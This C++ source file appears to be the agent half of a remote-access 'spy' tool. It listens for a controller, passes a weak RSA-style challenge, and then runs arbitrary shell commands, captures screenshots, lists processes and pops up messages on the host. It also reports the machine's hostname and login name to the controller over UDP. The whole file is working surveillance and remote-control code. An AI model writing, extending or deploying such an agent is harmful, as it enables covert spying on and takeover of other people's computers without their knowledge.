#include <iostream>
#include <sstream>
#include <map>
#include <unistd.h>
#include "proto.hh"
#include "../Net.hh"
#include "MsgBox.hh"
#include "Process.hh"
#include "ScreenShot.hh"
#include "Cmd.hh"
#include "../Controller/spy.hh"
#include <thread>
#include <cstdlib>


using namespace std;

int CURRENT_PORT;


namespace Spy {
    class session_on_spy : public Serv_session{
    public:
	session_on_spy(int socket) : Serv_session(socket) {
	    auth = false;
	    proto = new observer::proto_observer(socket);
	    (*proto)["INFO"].sig_recv.connect(boost::bind(&session_on_spy::do_info, this, _1));
	    (*proto)["WARNING"].sig_recv.connect(boost::bind(&session_on_spy::do_warning, this, _1));
	    (*proto)["GET_LIST_PROC"].sig_recv.connect(boost::bind(&session_on_spy::do_get_list_proc, this, _1));
	    (*proto)["GET_SCREENSHOT"].sig_recv.connect(boost::bind(&session_on_spy::do_get_screenshot, this, _1));
	    (*proto)["GET_BIG_SCREENSHOT"].sig_recv.connect(boost::bind(&session_on_spy::do_get_big_screenshot, this, _1));
	    (*proto)["SEND_CMD"].sig_recv.connect(boost::bind(&session_on_spy::do_send_cmd, this, _1));

	    (*proto)["RETOUR"].sig_recv.connect(boost::bind ( &session_on_spy::do_retour, this, _1));

	    begin.connect ( boost::bind ( &session_on_spy::on_begin, this));

	}

	
	void on_begin() {
	    m_content = rand()%20000;
	    cout << m_content << endl;;
	    unsigned long value  = expMod ( m_content, e, N );
	    cout << expMod ( value, d, N) << endl;
	    stringstream ss;
	    ss << value;
	    cout << value << endl;
	    (*proto)["TEST"](ss.str());
	}

	void do_retour ( string msg ) {
	    stringstream ss(msg);
	    unsigned long content;
	    ss >> content;
	    if ( content == m_content ) {
		auth = true;
		(*proto)["OK"]("");
	    } else {
		(*proto)["ERR"]("");
		finish();
	    }
	}

	void do_info(string msg) {
	    if ( auth ) {
		MsgBox::info(msg);
	    } else {
		(*proto)["ERR"]("");
		finish();
	    }
	}

	void do_warning(string msg) {
	    if ( auth ) {
		MsgBox::warning(msg);
	    } else {
		(*proto)["ERR"]("");
		finish();
	    }
	}
    
	void do_get_list_proc(string) {
	    if ( auth ) {
		Process proc;
		map<int, string> m = proc.get_list_process();
		stringstream ss;
		
		cout << "taille : " << m.size() << endl;
		for(auto it : m) {
		    ss << it.first << " " << it.second << " ";
		}
		
		ss << "//end//";
		(*proto)["LIST_PROC"](ss.str());
	    } else {
		(*proto)["ERR"]("");
		finish();
	    }
	}
    
	void do_get_screenshot(string data) {
	    if ( auth ) {
		stringstream s1, ss;
		s1 << data;
		double zoom;
		s1 >> zoom;
		
		ScreenShot sc(zoom);
		int w, h;
		cout << "zoom : " << zoom << endl;
		sc.save("test.bmp");
		sc.get_stringstream("test.bmp", ss, w, h, zoom);
		
		ofstream f("truc");
		f << ss.rdbuf();
		f.close();
		
		cout << ss.str().length() << endl;
		(*proto)("SCREENSHOT")(ss.str(), w, h);
	    } else {
		(*proto)["ERR"]("");
		finish();
	    }
	}

	void do_get_big_screenshot(string data) {
	    if ( auth ) {
	    
		stringstream s1, ss;
		s1 << data;
		double zoom;
		s1 >> zoom;
      
		ScreenShot sc(zoom);
		int w, h;
		cout << "zoom : " << zoom << endl;
		sc.save("bigtest.bmp");
		sc.get_stringstream("bigtest.bmp", ss, w, h, zoom);
		
		ofstream f("truc");
		f << ss.rdbuf();
		f.close();
		
		cout << ss.str().length() << endl;
		(*proto)("BIG_SCREENSHOT")(ss.str(), w, h);
	    } else {
		(*proto)["ERR"]("");
		finish();
	    }
	}


	void do_send_cmd(string _cmd) {
	    if ( auth ) {
		Cmd cmd;
		cout << "cmd : " << _cmd << endl;
		cmd.exec(_cmd.c_str());
		stringstream ss(cmd.get_res());
		ss << " //end//";
		(*proto)["RES_CMD"](ss.str());
	    } else {
		(*proto)["ERR"]("");
		finish();
	    }
	}

    private:
	string m_name, m_ip;
	int m_port;
	bool auth;
	unsigned long m_content;
    };
};



void init_cont_session (int argc, char ** argv) {
    Client_UDP<controller::spy_session> client ( argc, argv );
    char buffer[255];
    gethostname( buffer, 255 ); 
    client._session().set_ip(string(buffer));
    client._session().set_name( getlogin() );
    client._session().set_port( CURRENT_PORT );
    client._session().start();
    client.join();
}



int main(int argc, char** argv) {
    srand(time(NULL));
  Server <Spy::session_on_spy> serv(argc, argv);
  CURRENT_PORT = serv._port();
  thread t( init_cont_session, argc, argv);
  serv.start();
  serv.join();
}
